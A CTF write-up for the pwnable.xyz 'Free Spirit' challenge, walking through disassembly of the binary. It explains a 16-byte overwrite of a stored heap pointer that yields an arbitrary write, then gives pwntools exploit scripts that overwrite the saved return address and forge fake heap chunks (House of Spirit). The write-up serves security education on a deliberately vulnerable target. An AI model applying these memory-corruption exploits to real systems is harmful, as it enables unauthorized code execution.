---
layout: single
title:  "Pwnable.xyz - Free Spirit"
path: /posts/
date:   2020-07-17
tags: pwn pwnablexyz heap ctf
categories: pwn
classes: wide
author: komodino
excerpt: "Are you tired of reading short poor quality writeups that provide no learning value for the reader? Let's fix that. Free spirit is a pwn challenge on pwnabe.xyz and was actually the first challenge
that gave me the urge to write a nice detailed writeup. The main purpose of this writeup is for me to gather the research I made while trying to solve it, in one nice PoC so I can easily refer to it later."
header:
  teaser: /assets/images/freespirit/logo1.png
  teaser_home_page: true
---

### Intro
---
Every challenge on [pwnable.xyz](https://pwnable.xyz) has a very short hint in the download area. This time it was 
>Free is misbehaving again.    


### Dissasembly and Decompilation analysis.
---

First of all we will check the security mechanisms applied to the binary in order to acquire some insight in what to look for while analyzing.
Running `checksec` we get 
<p align="center">

    <img src="/assets/images/freespirit/0.png">

</p>

It seems that everything is enabled except **PIE** (Position Independent Executable).
**SPOILER** It almost seems that this has been done on purpose. Like monst pwnable.xyz binaries this also has a `win` function that we must call to get the flag.

Running the challenge, it seems that we can only input the numbers **1 2** and **3** as a means of selecting something. Let's see what each choice does.

I didn't really like gow `ghidra` handled the decompilation so after analysing the disassembly with `IDA` I will provide the approximate C code.

At the start of **main** we see  
<p align="center">

    <img src="/assets/images/freespirit/1.png">

</p>

First **r12 rbp** and **rbx** are pushed onto the stack and then the stack pointer is decreased by 0x50 = 80 bytes. We also see the stack guard being placed on the stack and **rbx** and **r12** being loaded with the addresses of **rsp+0x18** and **rsp+0x10** respectively.
In the end we notice there is a `malloc` call for **0x40** (64) bytes. The pointer returned by malloc is then stored in the stack at **rsp+0x10**.

Continuing we enter another block of code. Upon further analysis I realized that this is probably a `while(1)` block since for any given input of **1 2** or **3** execution flow will eventually return here. If the input is something else we break out of the loop and the program is terminated.

<p align="center">

    <img src="/assets/images/freespirit/2.png">
</p>

Here we see that the prompt `">"` will be printed and then `read(0,[rsp+0x18],0x30)` will be called. This means we can input 0x30 (48) bytes. Later our input is passed to `atoi()` to convert it to an integer and then it is compared to **1**. The program will then determince what path of execution it will take depending on our input. Let's examine each case seperately.

**Case: 1**

If we select **1** then `read(0,[rsp+0x10],0x20)` is called. At **rsp+0x10** is the pointer returned by malloc. So this `read` call means read 0x20 (32) bytes from stdin and store them at whatever heap space we allocated previously.

<p align="center">

    <img src="/assets/images/freespirit/3.png">
</p>

Afterwards return to the start of the `while(1)` loop.

**Case: 2**

If we select **2** we have

<p align="center">

    <img src="/assets/images/freespirit/4.png">
</p>

which translates to `printf("%p",r12)` but as we have seen in the first block of code **r12** contains the address **rsp+0x10**. So this will print the stack address of the malloc pointer and then return to the start of the loop.

**Case: 3**

If we choose **3** then first there is a check if a certain global variable called `limit` is greater than **1**. I couldn't figure out what this check is there for but **limit** is initialized to **zero** so it's all good.

<p align="center">

    <img src="/assets/images/freespirit/5.png">
</p>

<p align="center">

    <img src="/assets/images/freespirit/6.png">
</p>

Afterwards we first load into **rax** the address returned by malloc (heap). Then we take the contents of that address and store them into the **xmm0** register. Finally we store **xmm0** in **[rsp+0x8]** and then return to the start of the loop.

**Important:** Notice the instructions 
```asm
movdqu  xmm0, xmmword ptr [rax]
movdqu  xmmword ptr [rsp+8], xmm0
```
The **xmm0** register is a **128-bit** register. Using **xmmword ptr [rax]** we are actually loading a 128-bit (16 byte) word. This means that at **[rsp+8]** **16 bytes will be written**. But what is placed at [rsp+0x10] ([rsp+16]) ? That is where the stored malloc pointer resides!

It is understandable that we can overwrite the address stored at **[rsp+0x10]** . Remember how the binary behaves when we select **1**. It reads the address stored in **[rsp+0x10]** and stores up to 32 bytes there.
It is clear now that we can actually write anything anywhere :)

### Return Address Overwrite.
---

Our goal will be to overwrite tha saved return pointer with `win` 's address so when the main function returns we get our flag. Since he have an address leak of **rsp+0x10** when we select **2** , by analyzing the first block of code we see that the saved **$rip** is 0x58 bytes higher than the leak provided.

We can confirm this with gdb.

<p align="center">

    <img src="/assets/images/freespirit/7.png">
</p>

Saved **rip** is at `0x7fffffffe458` and our leaked address rsp+0x10 = `0x7fffffffe400`.

Let's begin creating an exploit skeleton. I'm using **tmux** so you can modify the below code to your needs.
Basically we will first write into the heap 8 bytes of random bytes and then the address of the saved return pointer ( 8 bytes ) using option **1**. Then using option **3** we will overwrite the saved heap pointer with the address of the saved **rip**. When we call **1** again we can write whatever we want into the saved rip , and of cource we choose the address of `win`.

```python
from pwn import *

context.terminal = ["tmux","splitw","-h"]
e = ELF("./challenge")
p = process("./challenge")

p.sendlineafter("> ","1")
p.sendline("A"*16)
p.sendlineafter("> ","2")
leaked_address = p.recvuntil("\n").strip()
saved_rip = int(leaked_address,16) + 0x58
gdb.attach(p,"x/2gx {}".format(hex(leaked_address)))
p.interactive()
```

Running the above script while in **tmux** we observe the address returned by malloc. Examinig that address we see `A` repeated 16 times , which was our input.

<p align="center">

    <img src="/assets/images/freespirit/8.png">
</p>

What happens if after **1** we select **3** and as we mentioned earlier overwrite the heap address stored in the stack ? 

Let's add `p.sendlineafter("> ","3")`  right after `sendline("A"*16)` and see what happens.

<p align="center">

    <img src="/assets/images/freespirit/9.png">
</p>

We actually overwrote the address the program will try to write to when **1** is selected. But overwriting it with `0x41414141...` isn't as fun as overwriting with where the stored $rip is...

We already know where the return pointer is stored ( 0x58 after our leak ) so we now only have to find the address of `win` function. This is really easy with pwntools.

The exploit will know look something like this.
```python
from pwn import *

context.terminal = ["tmux","splitw","-h"]
e = ELF("./challenge")
win = e.symbols["win"] # win address
p = process("./challenge")

# Find the leaked address
p.sendlineafter("> ","2")
leaked_address = p.recvuntil("\n").strip()
leaked_address = int(leaked_address,16)
saved_rip = leaked_address + 0x58 # RIP

# Write 8 bytes of junk and the address of saved_rip in the heap
p.sendlineafter("> ","1")
p.sendline("A" * 8 + p64(saved_rip))
# Trigger the stack overwrite
p.sendlineafter("> ","3")
# Overwrite the saved $rip with win's address
p.sendlineafter("> ","1")
p.sendline(p64(win))
gdb.attach(p, "x/2gx {}".format(hex(saved_rip)))
context(terminal = ['tmux', 'splitw','-h'])
p.interactive() 
```

As we see in the image below we succefully overwrote the return address with the address of the **win** function.

<p align="center">

    <img src="/assets/images/freespirit/10.png">
</p>

Now if we just let **main** return then **win** will be executed right??
Well...

<p align="center">

    <img src="/assets/images/freespirit/11.png">
</p>

You see `free` is complaining. The challenge isn't over yet and the good stuff starts now.

### The House of Spirit welcomes you.
---

Basically we can trick `free` into thinking that the address we pass to it is a valid allocated heap chunk.
A heap chunk looks like this.

```c
struct malloc_chunk {

INTERNAL_SIZE_T prev_size;
INTERNAL_SIZE_T size;
struct malloc_chunk * fd;
struct malloc_chunk * bk;
}
```

`prev_size` represents the size of the previous chunk if that chunk is free.
`size` represents the size of the current chunk.
The `fd` and `bk` pointers point to the next and previous free chunk and are only used if the current chunk is also free.

<p align="center">

    <img src="/assets/images/freespirit/12.png">
</p>
Source : [Understanding the heap by breaking it](https://paper.seebug.org/papers/Archive/refs/heap/bh-usa-07-ferguson-WP.pdf)


**Free** Chunk
<p align="center">

    <img src="/assets/images/freespirit/13.png">
</p>
Source: https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/


Here are some good sources about what `free` will attempt to check when called upon an address.  
[1] [https://dokydoky.tistory.com/459](https://dokydoky.tistory.com/459)   

[2] [https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks.html](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks.html)  

[3] [https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/)
  
Other classic and good resources include     
[4] [Malloc Maleficarum](https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt)  

[5] [Malloc Des-Maleficarum](http://phrack.org/issues/66/10.html)  


The technique we are going to use falls under the  **House of Spirit** introduced in the original **Malloc Maleficarum**. 

Quote from [https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit.html](https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit.html)

>The attacker creates a 'fake chunk', which can reside anywhere in the memory (heap, stack, etc.) and overwrites the pointer to point to it. The chunk has to be crafted in such a manner so as to pass all the security tests. This is not difficult and only involves setting the size and next chunk's size.

As you might have guessed we wil try to construct a fake heap chunk to bypass all `free` security checks.

First we need to find a writable memory are to create the chunk. Running `vmmap` shows we have write permission from `0x601000` to `0x602000`. So let's set `fake_chunk = 0x601050`.

In the last version of our exploit code we used the line `p.sendline(p64(win))` to overwrite the saved return pointer. Following the same logic as before we will modify this line to `p.sendline(p64(win) + p64(fake_chunk + 0x8))` . Let me explain. When this line is executed we overwrite the return pointer with `win`'s address and the next 8 bytes with the address of **fake_chunk + 0x8**. We will then choose option **3** to overwite the address in **rsp+0x10** with the address of **fake_chunk + 0x8**.

Up next we choose **1** to write at **fake_chunk + 0x8** the size of the chunk. Recall the structure of an allocated chunk. I chose the size of the original chunk so I left it to 0x51 which is actually 0x50 (80) bytes and the **P** flag set.

**Important** : Since free will also check the size of the next chunk we will have to create another fake chunk. That next chunk will be 0x50 bytes away from the first.

Final exploit.

```python
from pwn import *
from time import sleep
context.terminal = ['tmux', 'splitw', '-h']

e = ELF("./challenge")
#p = process("./challenge")
p = remote("svc.pwnable.xyz",30005)
p.sendlineafter("> ", "2")
leak_addr = p.recvuntil("\n").replace("\n", "")
leak_addr = int(leak_addr, 16)
print("[*] Starting Exploit...")
sleep(1)
print("[*] Stack leak : " + hex(leak_addr))
sleep(1)
saved_rip = hex(leak_addr + 0x58)
print("[*] Saved $rip is at " + hex(leak_addr) + " + 0x58 = " + saved_rip)
sleep(1)

p.sendlineafter("> ", "1")
print("[*] Writing 8 bytes of junk and the saved $rip address in the heap...")
sleep(1)
junk_and_gold = "A" * 8 + p64(int(saved_rip,16))
p.sendline(junk_and_gold)

print("[*] Overwriting saved heap chunk address with the address of saved $rip...")
p.sendlineafter("> ", "3")
sleep(1)

win_addr = e.symbols["win"]
p.sendlineafter("> ","1")
fake_chunk = 0x601050
p.sendline(p64(win_addr) + p64(fake_chunk + 0x8))
print("[+] Issuing saved $rip overwrite with the win function's address...")
sleep(1)

# Fake chunks
print("[+] Done.")
print("[*] Creating first fake heap chunk...")
p.sendlineafter("> ","3")
p.sendlineafter("> ","1")
p.sendline(p64(0x51) + p64(fake_chunk + 0x58))
p.sendlineafter("> ","3")
p.sendlineafter("> ","1")

print("[*] Creating second fake heap chunk...")
sleep(1)
lastch = p64(0x51) + p64(fake_chunk + 0x10)
p.sendline(lastch)
p.sendlineafter("> ", "3")
p.sendlineafter("> ","0")
p.interactive()
```

<script id="asciicast-uhdWIQT6qVnCDo8nbm9YCcKkH" src="https://asciinema.org/a/uhdWIQT6qVnCDo8nbm9YCcKkH.js" async></script>